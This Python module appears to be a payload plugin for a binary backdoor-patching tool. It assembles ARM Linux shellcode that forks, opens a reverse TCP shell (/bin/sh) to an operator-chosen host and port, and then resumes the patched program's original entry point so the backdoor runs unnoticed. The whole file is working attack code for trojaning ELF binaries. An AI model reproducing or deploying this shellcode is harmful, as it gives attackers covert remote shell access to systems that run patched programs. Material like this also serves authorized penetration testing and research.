import struct
import os
import logging
from core import support
from common import common
logger = logging.getLogger(__name__)


class fork_reverse_shell_tcp():

    def __init__(self):
        #could take this out HOST/PORT and put into each shellcode function
        #self.HOST = HOST
        #self.PORT = PORT
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "fork_reverse_shell_tcp"
        self.description = """Basic reverse_shell_tcp (non-stager) from metasploit"""
        self.requirements = {'MODE':'How the patching will happen',
                             'HOST':'<HOST to connect back to>',
                             'PORT':'<Port to connect back to>',
                             'ENCODER': '<Encoder you want to use, else none>'
                            }
        self.supported_modes = ['text_splitting']
        self.shellcode = ""
        self.apis_needed = None
        self.payload_type = 'single'

    def invoke(self, PM):
        # Expose patching method objects

        self.PM = PM
        # Expose BDF method objects
        self.BDF = self.PM.BDF
        logger.debug(f"IN PAYLOAD DEBUG: {dir(self)}")
        if support.support(self).check_reqs() is False:
            return False

        return self.run()

    def run(self):

        """
        Modified from metasploit payload/linux/armle/shell_reverse_tcp
        to correctly fork the shellcode payload and contiue normal execution.
        """

        # FORKING

        self.shellcode = b"\x00\x40\xa0\xe1"   # mov r4, r0
        self.shellcode += b"\x00\x00\x40\xe0"   # sub r0, r0, r0
        self.shellcode += b"\x02\x70\xa0\xe3"   # mov r7, #2
        self.shellcode += b"\x00\x00\x00\xef"   # scv 0
        self.shellcode += b"\x00\x00\x50\xe3"   # cmp r0, #
        self.shellcode += b"\x04\x00\xa0\xe1"   # mov r0, r4
        self.shellcode += b"\x04\x40\x44\xe0"   # sub r4, r4, r4
        self.shellcode += b"\x00\x70\xa0\xe3"   # mov r7, #0
        self.shellcode += b"\x00\x00\x00\x0a"   # beq to shellcode
        # JMP Address = (entrypoint - currentaddress -8)/4
        jmpAddr = 0xffffff + (self.PM.BDF.elf_object['e_entry'] - (self.PM.BDF.shellcode_vaddr +len(self.shellcode)) - 4)/4

        self.shellcode += struct.pack("<I", int(jmpAddr)).strip(b"\x00")
        self.shellcode += b"\xea"   # b entrypoint

        # ACTUAL SHELLCODE
        self.shellcode += bytes("\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x05\x20\x81\xe2\x8c\x70\xa0"
                            "\xe3\x8d\x70\x87\xe2\x00\x00\x00\xef\x00\x60\xa0\xe1\x84\x10"
                            "\x8f\xe2\x10\x20\xa0\xe3\x8d\x70\xa0\xe3\x8e\x70\x87\xe2\x00"
                            "\x00\x00\xef\x06\x00\xa0\xe1\x00\x10\xa0\xe3\x3f\x70\xa0\xe3"
                            "\x00\x00\x00\xef\x06\x00\xa0\xe1\x01\x10\xa0\xe3\x3f\x70\xa0"
                            "\xe3\x00\x00\x00\xef\x06\x00\xa0\xe1\x02\x10\xa0\xe3\x3f\x70"
                            "\xa0\xe3\x00\x00\x00\xef\x48\x00\x8f\xe2\x04\x40\x24\xe0\x10"
                            "\x00\x2d\xe9\x0d\x20\xa0\xe1\x04\x00\x2d\xe9\x0d\x20\xa0\xe1"
                            "\x10\x00\x2d\xe9\x48\x10\x9f\xe5\x02\x00\x2d\xe9\x00\x20\x2d"
                            "\xe9\x0d\x10\xa0\xe1\x04\x00\x2d\xe9\x0d\x20\xa0\xe1\x0b\x70"
                            "\xa0\xe3\x00\x00\x00\xef"
                            "\x00\x00\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef" #exit
                            "\x02\x00", 'iso-8859-1')

        self.shellcode += struct.pack('!H', int(self.PORT))
        self.shellcode += common.pack_ip_addresses(self.HOST)
        self.shellcode += bytes("\x2f\x62\x69\x6e"
                            "\x2f\x73\x68\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2d\x43\x00"
                            "\x00", 'iso-8859-1')
        # exit test
        # self.shellcode += "\x00\x00\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef"

        return self.shellcode
